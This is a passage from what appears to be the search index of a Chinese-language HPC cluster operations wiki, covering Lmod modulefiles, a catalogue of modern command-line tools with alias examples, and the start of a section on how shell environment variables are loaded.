\u8f6f\u4ef6\u7684 modulefile \u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>/apps/modulefiles/ddt/5.0.1.lua\n</code></pre> <p>\u4e00\u4e9b\u5e38\u7528\u51fd\u6570\u5982\u4e0b\uff1a</p> <pre><code>-- \u5e2e\u52a9\nhelp([[\n    text\n]])\nwhatis(\"Description: text\")\n-- \u73af\u5883\u53d8\u91cf\nsetenv(\"NAME\", \"VALUE\")\nprepend_path(\"PATH\", \"/path/to/bin\")\nappend_path(\"LD_LIBRARY_PATH\", \"/path/to/lib\")\npushenv(\"NAME\", \"VALUE\")\n-- \u4f9d\u8d56\nload(\"module1\", \"module2\")\ntry_load(\"module1\", \"module2\")\nalways_load(\"module1\", \"module2\")\nprereq(\"module1\", \"module2\")\nprereq(atleast(\"module1\", \"1.2.3\"))\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/lmod/#\u7528\u6237\u81ea\u5b9a\u4e49-module","title":"\u7528\u6237\u81ea\u5b9a\u4e49 module","text":"<p>Advanced User Guide for Personal Modulefiles</p> <p>\u6211\u4eec\u5728\u96c6\u7fa4\u4e2d\u8bbe\u7f6e\u9ed8\u8ba4 <code>MODULEPATH</code> \u6307\u5411 <code>/opt/apps/modulefiles</code>\uff0c\u63d0\u4f9b\u901a\u7528\u7684\u8f6f\u4ef6\u5305\u3002\u7528\u6237\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u76ee\u5f55\u4e0b\u521b\u5efa <code>modulefiles</code>\uff0c\u6309\u6587\u6863\u5c06\u5176\u6dfb\u52a0\u5230 <code>MODULEPATH</code> \u4e2d\uff0c\u5373\u53ef\u540c\u65f6\u4f7f\u7528\u81ea\u5df1\u7684 module \u548c\u96c6\u7fa4\u63d0\u4f9b\u7684 module\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/software/modern-cli/","title":"\u73b0\u4ee3\u5316 CLI \u5de5\u5177","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#\u73b0\u4ee3\u5316-cli-\u5de5\u5177","title":"\u73b0\u4ee3\u5316 CLI \u5de5\u5177","text":"<p>Quote</p> <ul> <li> ibraheemdev/modern-unix</li> <li> x-cmd/x-cmd</li> <li>Terminal Trove</li> </ul> <p>\u7528\u6237\u4e3b\u8981\u4f7f\u7528\u547d\u4ee4\u884c\u7528\u6237\u754c\u9762\uff08Command Line Interface\uff0cCLI\uff09\u767b\u9646\u96c6\u7fa4\u3002\u96c6\u7fa4\u4e0a\u5b89\u88c5\u4e86\u4e00\u4e9b\u73b0\u4ee3\u5316\u7684 CLI \u5de5\u5177\uff0c\u5b83\u4eec\u6709\u7684\u63d0\u9ad8\u4e86\u89c6\u89c9\u4f53\u9a8c\uff0c\u6709\u7684\u63d0\u4f9b\u4e86\u66f4\u4e30\u5bcc\u7684\u529f\u80fd\uff0c\u6709\u7684\u8fdb\u884c\u4e86\u6027\u80fd\u4f18\u5316\u3002\u501f\u52a9\u8fd9\u4e9b\u73b0\u4ee3\u5316\u7684 CLI \u5de5\u5177\uff0c\u53ef\u4ee5\u8ba9\u4f60\u66f4\u9ad8\u6548\u5730\u4f7f\u7528\u96c6\u7fa4\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#aria2c-wget-curl","title":"<code>aria2c</code> (<code>wget</code>, <code>curl</code>)","text":"<p>aria2 \u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684\u591a\u534f\u8bae\u3001\u591a\u6765\u6e90\u3001\u8de8\u5e73\u53f0\u4e0b\u8f7d\u5de5\u5177\uff0c\u8fd0\u884c\u4e8e\u547d\u4ee4\u884c\u754c\u9762\u3002\u5b83\u652f\u6301 HTTP/HTTPS\u3001FTP\u3001SFTP\u3001BitTorrent \u548c Metalink\u3002</p> <p><code>aria2c</code> \u662f aria2 \u7684\u547d\u4ee4\u884c\u5ba2\u6237\u7aef\uff0c\u53ef\u4ee5\u89c6\u4e3a <code>wget</code> \u548c <code>curl</code> \u7684\u66ff\u4ee3\u54c1\u3002\u6700\u5e38\u89c1\u7684\u7528\u6cd5\u662f\u8fdb\u884c\u591a\u8fde\u63a5\u4e0b\u8f7d\uff0c\u8fd9\u4e5f\u80fd\u5145\u5206\u5229\u7528\u96c6\u7fa4\u7684\u591a\u62e8\u5e26\u5bbd\u4f18\u52bf\uff0c\u5e38\u89c1\u60c5\u51b5\u4e0b\u90fd\u80fd\u76f4\u63a5\u8dd1\u5230\u6ee1\u901f\uff1a</p> <pre><code>aria2c -x16 http://example.com/file.iso\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#bat-cat","title":"<code>bat</code> (<code>cat</code>)","text":"<p><code>bat</code> \u662f <code>cat</code> \u547d\u4ee4\u7684\u589e\u5f3a\u7248\u672c\uff0c\u4f7f\u7528 Rust \u7f16\u5199\uff0c\u96c6\u6210\u4e86\u8bed\u6cd5\u9ad8\u4eae\u3001Git \u96c6\u6210\u548c\u81ea\u52a8\u5206\u9875\u529f\u80fd\u3002</p> <p>\u5b83\u7684\u8bed\u6cd5\u9ad8\u4eae\u652f\u6301\u591a\u79cd\u7f16\u7a0b\u8bed\u8a00\u548c\u6807\u8bb0\u8bed\u8a00\uff0c\u4f7f\u4ee3\u7801\u5728\u7ec8\u7aef\u4e2d\u66f4\u52a0\u6613\u8bfb\u3002Git \u96c6\u6210\u529f\u80fd\u5141\u8bb8\u7528\u6237\u67e5\u770b\u4e0e\u7d22\u5f15\u76f8\u5173\u7684\u4fee\u6539\uff0c\u7a81\u51fa\u663e\u793a\u65b0\u589e\u6216\u66f4\u6539\u7684\u884c\u3002</p> <p><code>bat</code> \u4f1a\u4f7f\u7528\u7c7b\u4f3c\u4e8e <code>less</code> \u7684\u5206\u9875\u5668\u81ea\u52a8\u5206\u9875\u5185\u5bb9\uff0c\u63d0\u9ad8\u53ef\u8bfb\u6027\u3002\u6b64\u5916\uff0c<code>bat</code> \u8fd8\u53ef\u4ee5\u663e\u793a\u4e0d\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u5e76\u652f\u6301\u6587\u4ef6\u4e32\u8054\uff0c\u4fdd\u6301\u4e86\u57fa\u672c\u6587\u672c\u67e5\u770b\u548c\u5408\u5e76\u4efb\u52a1\u7684\u5b9e\u7528\u6027\u3002</p> <p></p> Info <p>\u5728 Debian APT \u4e2d\u5305\u540d\u4e3a <code>bat</code>\uff0c\u4e8c\u8fdb\u5236\u540d\u4e3a <code>batcat</code>\uff0c\u4e0e\u4e4b\u53d1\u751f\u547d\u540d\u51b2\u7a81\u7684\u5305\u4e3a <code>bacula-console-qt</code>\uff08\u89c1  Issue #656 \u00b7 sharkdp/bat\uff09\u3002</p> <p>\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u6211\u4eec\u521b\u5efa\u4e86\u522b\u540d <code>bat</code>\uff1a</p> <pre><code>ln -s /usr/bin/batcat /usr/bin/bat\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#btop-top","title":"<code>btop</code> (<code>top</code>)","text":"<p><code>btop</code> \u662f\u4e00\u4e2a\u7ec8\u7aef\u8d44\u6e90\u76d1\u63a7\u5de5\u5177\uff0c\u5b9e\u65f6\u53ef\u89c6\u5316\u60a8\u673a\u5668\u7684 CPU\u3001\u5185\u5b58\u3001\u78c1\u76d8\u3001\u7f51\u7edc\u548c\u8fdb\u7a0b\u7684\u4f7f\u7528\u7edf\u8ba1\u3002</p> <p>\u5b83\u4f7f\u7528 C++ \u7f16\u5199\uff0cTUI \u7528\u6237\u754c\u9762\u63d0\u4f9b\u6e05\u6670\u3001\u4ea4\u4e92\u548c\u8be6\u7ec6\u7684\u56fe\u8868\uff0c\u5e76\u4e14\u54cd\u5e94\u8fc5\u901f\u3002\u5b83\u5177\u6709\u7535\u6c60\u8ba1\u548c\u8fc7\u6ee4\u8fdb\u7a0b\u7684\u529f\u80fd\uff0c\u53ef\u4ee5\u4ee5\u6811\u72b6\u56fe\u663e\u793a\u8fdb\u7a0b\uff0c\u663e\u793a\u7f51\u7edc\u4f7f\u7528\u7684\u81ea\u9002\u5e94\u7f29\u653e\u56fe\u8868\uff0c\u4ee5\u53ca\u78c1\u76d8\u6d3b\u52a8\u7684 I/O \u6d3b\u52a8\u7b49\u66f4\u591a\u6709\u7528\u4fe1\u606f\u3002</p> <p><code>btop</code> \u975e\u5e38\u9002\u5408\u9700\u8981\u5373\u65f6\u5206\u6790\u7cfb\u7edf\u72b6\u6001\uff0c\u7279\u522b\u662f\u76d1\u63a7\u8d44\u6e90\u5bc6\u96c6\u578b\u6d3b\u52a8\u65f6\u4f7f\u7528\u3002</p> <p></p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#duf-df","title":"<code>duf</code> (<code>df</code>)","text":"<p><code>Duf</code> \u662f\u4e00\u4e2a\u7528\u4e8e\u4ee5\u66f4\u53cb\u597d\u7684\u65b9\u5f0f\u67e5\u770b\u78c1\u76d8\u4f7f\u7528\u60c5\u51b5\u7684\u5de5\u5177\uff0c\u6bd4 <code>df</code> \u66f4\u5feb\u901f\u3002\u5b83\u4f7f\u7528 Go \u8bed\u8a00\u7f16\u5199\uff0c\u80fd\u591f\u4ee5\u6587\u672c\u548c\u56fe\u5f62\u683c\u5f0f\u663e\u793a\u4fe1\u606f\u3002</p> <p></p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#dive","title":"<code>dive</code>","text":"<p>A tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI image.</p> <p></p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#eza-ls","title":"<code>eza</code> (<code>ls</code>)","text":"<p><code>eza</code> \u662f Unix \u548c Linux \u7cfb\u7edf\u4e2d\u81ea\u5e26\u7684 <code>ls</code> \u6587\u4ef6\u5217\u8868\u547d\u4ee4\u884c\u7a0b\u5e8f\u7684\u66ff\u4ee3\u54c1\uff0c\u5c0f\u5de7\u3001\u5feb\u901f\u4e14\u73b0\u4ee3\u5316\u3002</p> <p>\u5b83\u901a\u8fc7\u989c\u8272\u533a\u5206\u6587\u4ef6\u7c7b\u578b\u548c\u5143\u6570\u636e\uff0c\u652f\u6301\u7b26\u53f7\u94fe\u63a5\u3001\u6269\u5c55\u5c5e\u6027\u4ee5\u53ca Git \u4fe1\u606f\u3002</p> <p><code>eza</code> \u662f\u4e00\u4e2a\u6301\u7eed\u7ef4\u62a4\u7684\u5206\u652f\uff0c\u4e0d\u8981\u4e0e\u5b83\u7684\u65e7\u7248\u672c <code>exa</code> \u6df7\u6dc6\u3002</p> <p>Note</p> <p>\u76ee\u524d\uff0c<code>eza</code> \u5c1a\u672a\u8fdb\u5165 Debian APT \u4ed3\u5e93\u3002\u6211\u4eec\u5b89\u88c5\u4e86 <code>exa</code>\uff0c\u5b83\u662f <code>eza</code> \u7684\u4e0a\u4e00\u4ee3\u7248\u672c\uff0c\u4f46\u5df2\u505c\u6b62\u7ef4\u62a4\u3002</p> <p></p> <p>\u4f60\u53ef\u4ee5\u5728\u81ea\u5df1\u7684 shell \u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u522b\u540d\uff1a</p> Gist: AppleBoiy/alias_eza.md<pre><code>alias ls='eza'\nalias l='eza -lbF --git'\nalias ll='eza -lbGF --git'\nalias llm='eza -lbGd --git --sort=modified'\nalias la='eza -lbhHigUmuSa --time-style=long-iso --git --color-scale'\nalias lx='eza -lbhHigUmuSa@ --time-style=long-iso --git --color-scale'\n\n# specialty views\nalias lS='eza -1'\nalias lt='eza --tree --level=2'\nalias l.=\"eza -a | grep -E '^\\.'\"\n</code></pre> Gist: jponge/exa-aliases.sh<pre><code>alias l=\"exa --sort Name\"\nalias ll=\"exa --sort Name --long\"\nalias la=\"exa --sort Name --long --all\"\nalias lr=\"exa --sort Name --long --recurse\"\nalias lra=\"exa --sort Name --long --recurse --all\"\nalias lt=\"exa --sort Name --long --tree\"\nalias lta=\"exa --sort Name --long --tree --all\"\nalias ls=\"exa --sort Name\"\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#fd-find","title":"<code>fd</code> (<code>find</code>)","text":"<p><code>fd</code> \u662f\u4e00\u4e2a\u57fa\u4e8e Rust \u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u65e8\u5728\u4ee5\u7b80\u6d01\u548c\u9ad8\u6548\u7684\u65b9\u5f0f\u67e5\u627e\u6587\u4ef6\u3002</p> <p>\u5b83\u88ab\u8bbe\u8ba1\u4e3a\u6bd4\u4f20\u7edf\u7684 <code>find</code> \u547d\u4ee4\u66f4\u6613\u7528\u4e14\u66f4\u5feb\u901f\u7684\u66ff\u4ee3\u54c1\u3002<code>fd</code> \u4ee5\u7528\u6237\u53cb\u597d\u4e3a\u7279\u70b9\uff0c\u652f\u6301\u76f4\u89c2\u7684\u8bed\u6cd5\u3001\u5f69\u8272\u8f93\u51fa\u548c\u667a\u80fd\u5927\u5c0f\u5199\u641c\u7d22\u3002</p> <p>\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\uff0c\u5b83\u5229\u7528\u5e76\u884c\u641c\u7d22\uff0c\u5e76\u9ed8\u8ba4\u9075\u5b88 <code>.gitignore</code> \u89c4\u5219\uff0c\u4f7f\u5f00\u53d1\u8005\u7684\u6587\u4ef6\u641c\u7d22\u8fc7\u7a0b\u66f4\u52a0\u7b80\u5316\u3002</p> <p></p> <p>Info</p> <p>\u5728 Debian APT \u4e2d\u5305\u540d\u4e3a <code>fd-find</code>\uff0c\u4e8c\u8fdb\u5236\u540d\u4e3a <code>fdfind</code>\uff0c\u4e0e\u4e4b\u53d1\u751f\u547d\u540d\u51b2\u7a81\u7684\u5305\u4e3a <code>fdclone</code>\uff08\u89c1  Issue #1009 \u00b7 sharkdp/fd\uff09\u3002</p> <p>\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u6211\u4eec\u521b\u5efa\u4e86\u522b\u540d <code>fd</code>\uff1a</p> <pre><code>ln -s /usr/bin/fdfind /usr/bin/fd\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#fq-hexdump","title":"<code>fq</code> (<code>hexdump</code>)","text":"<p><code>fq</code> \u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u7c7b\u4f3c\u4e8e <code>jq</code>\uff0c\u4f46\u7528\u4e8e\u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u5b83\u652f\u6301\u591a\u79cd\u6587\u4ef6\u683c\u5f0f\uff0c\u5982\u53ef\u6267\u884c\u6587\u4ef6\u3001\u5bb9\u5668\u7f16\u89e3\u7801\u5668\u4ee5\u53ca\u5404\u79cd\u5e8f\u5217\u5316\u683c\u5f0f\u7b49\u3002</p> <p>\u5b83\u5177\u6709\u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u663e\u793a\u4e3a\u7ecf\u8fc7\u89e3\u7801\u7684\u6811\u72b6\u7ed3\u6784\u7684\u529f\u80fd\uff0c\u5e76\u80fd\u591f\u5bf9\u6570\u636e\u8fdb\u884c\u8f6c\u6362\u3001\u5207\u7247\u548c\u8fde\u63a5\uff0c\u8fd8\u652f\u6301\u5d4c\u5957\u683c\u5f0f\u3002\u6b64\u5916\uff0c<code>fq</code> \u8fd8\u5305\u542b\u4e00\u4e2a\u4ea4\u4e92\u5f0f REPL\uff08Read-Eval-Print Loop\uff0c\u4e00\u79cd\u4ea4\u4e92\u5f0f\u7f16\u7a0b\u73af\u5883\uff09\uff0c\u652f\u6301\u51fd\u6570\u548c\u540d\u79f0\u7684\u81ea\u52a8\u8865\u5168\u3002</p> <p><code>fq</code> \u975e\u5e38\u9002\u5408\u7528\u4e8e\u67e5\u8be2\u3001\u68c0\u67e5\u548c\u8c03\u8bd5\u4e8c\u8fdb\u5236\u683c\u5f0f\uff0c\u5c24\u5176\u5bf9\u4ece\u4e8b\u8c03\u8bd5\u548c\u6570\u636e\u8f6c\u6362\u7b49\u9886\u57df\u7684\u5f00\u53d1\u8005\u6709\u5e2e\u52a9\uff0c\u4e5f\u53ef\u7528\u4e8e\u5feb\u901f\u68c0\u67e5\u6587\u4ef6\u683c\u5f0f\u3002</p> <p></p> <p>\u57fa\u672c\u7528\u6cd5\u4e3a <code>fq . file</code>\uff0c<code>fq d file</code>\uff0c<code>fq 'some query' file</code>\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#fzf-grep","title":"<code>fzf</code> (<code>grep</code>)","text":"<p><code>fzf</code> \u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u63d0\u4f9b\u4e86\u4e00\u79cd\u5feb\u901f\u76f4\u89c2\u7684\u65b9\u5f0f\u6765\u641c\u7d22\u548c\u6d4f\u89c8\u6587\u4ef6\u3001\u547d\u4ee4\u548c\u76ee\u5f55\uff0c\u4f7f\u7528\u6a21\u7cca\u5339\u914d\u548c\u81ea\u52a8\u8865\u5168\u529f\u80fd\u3002</p> <p><code>fzf</code> \u53ef\u4ee5\u7528\u4e8e\u4efb\u4f55\u5217\u8868\uff0c\u5305\u62ec\u6587\u4ef6\u3001\u547d\u4ee4\u5386\u53f2\u3001\u8fdb\u7a0b\u3001\u4e3b\u673a\u540d\u3001\u4e66\u7b7e\u3001Git \u63d0\u4ea4\u7b49\uff0c\u5e76\u4e14\u53ef\u4ee5\u4e0e\u591a\u79cd Shell\uff08\u5982 zsh\u3001bash \u6216 fish\uff09\u3001\u7f16\u8f91\u5668\uff08\u5982 vim \u548c neovim\uff09\u4ee5\u53ca tmux \u96c6\u6210\u3002</p> <p><code>fzf</code> \u5177\u6709\u53ef\u79fb\u690d\u6027\uff0c\u6ca1\u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u9002\u7528\u4e8e macOS\u3001Windows\u3001Linux \u548c BSD \u7cfb\u7edf\u3002</p> <p></p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#gdu-du","title":"<code>gdu</code> (<code>du</code>)","text":"<p><code>gdu</code>\uff08\u5373 Go Disk Usage \u7684\u7f29\u5199\uff09\u662f\u4e00\u4e2a\u5feb\u901f\u7684\u78c1\u76d8\u4f7f\u7528\u5206\u6790\u5668\uff0c\u5177\u6709 TUI \u754c\u9762\u3002</p> <p>\u5b83\u63d0\u4f9b\u4e86\u78c1\u76d8\u4f7f\u7528\u7684\u56fe\u5f62\u6982\u89c8\uff0c\u663e\u793a\u6700\u5927\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u5e76\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u53ef\u7528\u7a7a\u95f4\u53ca\u5176\u7ba1\u7406\u529f\u80fd\u3002</p> <p>\u63a8\u8350\u7ed9\u7cfb\u7edf\u7ba1\u7406\u5458\u548c\u9700\u8981\u5feb\u901f\u76d1\u63a7\u548c\u7ba1\u7406\u78c1\u76d8\u7a7a\u95f4\u7684\u7528\u6237\uff0c\u9002\u7528\u4e8e Windows\u3001Mac \u548c Linux \u7b49\u4efb\u4f55\u5e73\u53f0\u3002</p> <p><code>ncdu</code> took 7.4 seconds to scan a home directory with around 280GB of content on an NVMe disk in the test, while <code>gdu</code> completed the same task within milliseconds</p> <p></p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#gping-ping","title":"<code>gping</code> (<code>ping</code>)","text":"<p><code>gping</code> \u7c7b\u4f3c\u4e8e\u5e38\u89c4\u7684 <code>ping</code> \u547d\u4ee4\uff0c\u4f46\u5e26\u6709\u56fe\u5f62\u5316\u663e\u793a\u3002\u5b83\u662f\u4e00\u4e2a\u7ec8\u7aef\u5e94\u7528\u7a0b\u5e8f\uff0c\u63d0\u4f9b <code>ping</code> \u547d\u4ee4\u7684\u5b9e\u65f6\u53ef\u89c6\u5316\u53cd\u9988\u3002</p> <p>\u5b83\u7684\u529f\u80fd\u5305\u62ec\u591a\u4e2a\u4e3b\u673a\u7684\u5ef6\u8fdf\u6d4b\u8bd5\u3001\u547d\u4ee4\u6267\u884c\u65f6\u95f4\u6d4b\u8bd5\u548c\u989c\u8272\u504f\u597d\u81ea\u5b9a\u4e49\u7b49\u3002<code>gping</code> \u8de8\u5e73\u53f0\u53ef\u7528\uff0c\u652f\u6301 Windows\u3001Mac \u548c Linux \u7cfb\u7edf\uff0c\u5e76\u4e14\u5728\u4f7f\u7528\u5b8c\u7a0b\u5e8f\u540e\u63d0\u4f9b\u6e05\u9664\u7ec8\u7aef\u56fe\u5f62\u7684\u9009\u9879\uff0c\u786e\u4fdd\u4e0d\u7559\u6742\u4e71\u4fe1\u606f\u3002</p> <p><code>gping</code> \u662f\u7f51\u7edc\u3001\u7cfb\u7edf\u548c DevOps \u5de5\u7a0b\u5e08\u7684\u4f18\u79c0\u5de5\u5177\uff0c\u4e5f\u9002\u5408\u4efb\u4f55\u5e0c\u671b\u53ef\u89c6\u5316 <code>ping</code> \u8f93\u51fa\u7684\u4eba\u3002\u5b83\u5728\u9700\u8981\u53ef\u8bfb\u6027\u548c\u89c6\u89c9\u6c9f\u901a\u7684\u73af\u5883\u4e2d\u6548\u679c\u6700\u4f73\u3002</p> <p></p> Info <p>\u5728 Debian APT \u4e2d\uff0c\u5305\u540d\u4e3a <code>gping</code>\uff0c\u76ee\u524d\u8fdb\u5165\u4e86 testing \u4ed3\u5e93\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#http-curl-telnet","title":"<code>http</code> (<code>curl</code>, <code>telnet</code>)","text":"<p>HTTPie \u662f\u4e00\u4e2a\u547d\u4ee4\u884c HTTP \u5ba2\u6237\u7aef\uff0c\u65e8\u5728\u4f7f\u4e0e\u7f51\u7edc\u670d\u52a1\u7684 CLI \u4ea4\u4e92\u5c3d\u53ef\u80fd\u4eba\u6027\u5316\u3002HTTPie \u4e13\u4e3a\u6d4b\u8bd5\u3001\u8c03\u8bd5\u4ee5\u53ca\u4e0e API \u548c HTTP \u670d\u52a1\u5668\u7684\u4ea4\u4e92\u8bbe\u8ba1\u3002\u901a\u8fc7 <code>http</code> \u548c <code>https</code> \u547d\u4ee4\u53ef\u4ee5\u521b\u5efa\u5e76\u53d1\u9001\u4efb\u610f HTTP \u8bf7\u6c42\uff0c\u4f7f\u7528\u7b80\u5355\u76f4\u89c2\u7684\u8bed\u6cd5\uff0c\u5e76\u63d0\u4f9b\u683c\u5f0f\u5316\u548c\u5f69\u8272\u8f93\u51fa\u3002</p> <p></p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#hyperfine-time","title":"<code>hyperfine</code> (<code>time</code>)","text":"<p><code>hyperfine</code> \u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u57fa\u51c6\u6d4b\u8bd5\u5de5\u5177\u3002\u5b83\u901a\u8fc7\u591a\u6b21\u8fd0\u884c\u63d0\u4f9b\u7edf\u8ba1\u5206\u6790\uff0c\u652f\u6301\u4efb\u610f Shell \u547d\u4ee4\uff0c\u5e76\u5728\u7ec8\u7aef\u4e2d\u63d0\u4f9b\u6301\u7eed\u7684\u57fa\u51c6\u6d4b\u8bd5\u8fdb\u5ea6\u53cd\u9988\u3002</p> <p>\u5176\u989d\u5916\u529f\u80fd\u5305\u62ec\u8bbe\u7f6e\u9884\u70ed\u8fd0\u884c\u548c\u6e05\u7406\u7f13\u5b58\u547d\u4ee4\u3001\u7edf\u8ba1\u79bb\u7fa4\u503c\u68c0\u6d4b\u4ee5\u53ca\u81ea\u5b9a\u4e49\u57fa\u51c6\u6d4b\u8bd5\u3002\u9664\u4e86\u5e38\u89c4\u7684\u57fa\u51c6\u6d4b\u8bd5\uff0c<code>hyperfine</code> \u8fd8\u652f\u6301\u5c06\u7ed3\u679c\u5bfc\u51fa\u4e3a\u591a\u79cd\u683c\u5f0f\uff0c\u5982 CSV\u3001JSON\u3001Markdown\u3001AsciiDoc\u3002</p> <p><code>hyperfine</code> \u7279\u522b\u9002\u5408\u4ece\u4e8b\u8f6f\u4ef6\u6027\u80fd\u6d4b\u8bd5\u548c\u4f18\u5316\u7684\u4eba\uff0c\u5c24\u5176\u662f\u5728\u5904\u7406\u5927\u578b\u6216\u590d\u6742\u7684\u8f6f\u4ef6\u9879\u76ee\u65f6\u3002\u5f53\u4f60\u9700\u8981\u5bf9\u5e94\u7528\u7a0b\u5e8f\u3001\u7b97\u6cd5\u8fdb\u884c\u57fa\u51c6\u6d4b\u8bd5\uff0c\u6216\u5b9a\u671f\u76d1\u63a7\u8f6f\u4ef6\u6027\u80fd\u65f6\uff0c<code>hyperfine</code> \u662f\u4e00\u4e2a\u503c\u5f97\u62e5\u6709\u7684\u5de5\u5177\u3002</p> <p></p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#rg-grep","title":"<code>rg</code> (<code>grep</code>)","text":"<p>Ripgrep \u662f\u4e00\u4e2a\u9762\u5411\u884c\u7684\u641c\u7d22\u5de5\u5177\uff0c\u5b83\u4f1a\u9012\u5f52\u641c\u7d22\u5f53\u524d\u76ee\u5f55\u4e2d\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u6a21\u5f0f\uff0c\u540c\u65f6\u9075\u5b88 <code>.gitignore</code> \u89c4\u5219\u3002</p> <p>Ripgrep \u5728 Windows\u3001macOS \u548c Linux \u4e0a\u5747\u6709\u4e00\u6d41\u7684\u652f\u6301\u3002</p> <p></p> Info <p>\u5728 Debian-based \u53d1\u884c\u7248\u4e2d\uff0c\u5305\u540d\u4e3a <code>ripgrep</code>\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#tig-git","title":"<code>tig</code> (<code>git</code>)","text":"<p><code>tig</code> \u662f\u4e00\u4e2a\u57fa\u4e8e ncurses \u7684 Git \u4ed3\u5e93\u7528\u6237\u754c\u9762\u5de5\u5177\uff0c\u4e3b\u8981\u7528\u4e8e\u6d4f\u89c8 Git \u4ed3\u5e93\uff0c\u5e2e\u52a9\u7528\u6237\u53ef\u89c6\u5316 Git \u5386\u53f2\u3002</p> <p>\u5176\u6838\u5fc3\u529f\u80fd\u5305\u62ec\u663e\u793a\u63d0\u4ea4\u56fe\u3001\u67e5\u770b\u6bcf\u6b21\u63d0\u4ea4\u7684\u5dee\u5f02\uff0c\u4ee5\u53ca\u9010\u884c\u6682\u5b58\u63d0\u4ea4\u7684\u529f\u80fd\u3002</p> <p>\u6b64\u5916\uff0c<code>tig</code> \u8fd8\u63d0\u4f9b\u641c\u7d22\u5de5\u5177\u3001blame \u89c6\u56fe\u548c cherry-pick \u64cd\u4f5c\u7b49\u9644\u52a0\u529f\u80fd\u3002</p> <p></p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/modern-cli/#z-cd","title":"<code>z</code> (<code>cd</code>)","text":"<p><code>zoxide</code> \u662f\u4e00\u4e2a\u9ad8\u7ea7\u76ee\u5f55\u5bfc\u822a\u5de5\u5177\uff0c\u66ff\u4ee3 <code>cd</code> \u547d\u4ee4\uff0c\u7b80\u5316\u5728\u5e38\u7528\u76ee\u5f55\u4e4b\u95f4\u7684\u5207\u6362\u3002</p> <p>\u5b83\u57fa\u4e8e Rust \u7f16\u5199\uff0c\u517c\u5bb9\u4e3b\u6d41 Shell\uff0c\u80fd\u591f\u667a\u80fd\u6392\u5e8f\u5e38\u7528\u76ee\u5f55\uff0c\u7528\u6237\u53ef\u4ee5\u7528\u66f4\u5c11\u7684\u6309\u952e\u5feb\u901f\u5207\u6362\u76ee\u5f55\u3002</p> <p><code>zoxide</code> \u8de8\u5e73\u53f0\u652f\u6301\uff0c\u9002\u7528\u4e8e macOS\u3001Windows\u3001Linux \u548c BSD \u7cfb\u7edf\u3002</p> <p>\u4f60\u53ef\u4ee5\u6309\u7167 GitHub \u4e0a\u7684\u8bf4\u660e\u5728\u81ea\u5df1\u7684 shell \u4e2d\u542f\u7528\u5b83\u3002</p> <p></p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/","title":"\u73af\u5883\u53d8\u91cf\u4e0e Shell","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#\u73af\u5883\u53d8\u91cf\u4e0e-shell","title":"\u73af\u5883\u53d8\u91cf\u4e0e Shell","text":"Quote <ul> <li>Why is /etc/profile not invoked for non-login shells? - AskUbuntu</li> </ul> <p>\u5bf9\u4e8e SSH \u767b\u5f55\u3001\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u3001\u672c\u673a\u767b\u5f55\u7b49\u4e0d\u540c\u573a\u666f\uff0c\u73af\u5883\u53d8\u91cf\u53ef\u80fd\u4e0d\u540c\uff0c\u8fd9\u5e38\u5e38\u5f15\u8d77\u8bb8\u591a\u56f0\u60d1\u3002\u672c\u7bc7\u6587\u7ae0\u6839\u636e\u76f8\u5173\u8d44\u6599\u603b\u7ed3\u4e00\u4e0b\u73af\u5883\u53d8\u91cf\u7684\u52a0\u8f7d\u8fc7\u7a0b\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#shell-\u7684\u6a21\u5f0f","title":"Shell \u7684\u6a21\u5f0f","text":"Quote <ul> <li>login/non-login and interactive/non-interactive shells [duplicate] - StackExchange</li> <li>Why is /etc/profile not invoked for non-login shells? - AskUbuntu</li> <li><code>ssh &lt;host&gt;</code> is a login shell, but <code>ssh &lt;host&gt; &lt;command&gt;</code> is not? - SuperUser</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#loginnon-login-shell","title":"login/non-login shell","text":"<p>login/non-login shell 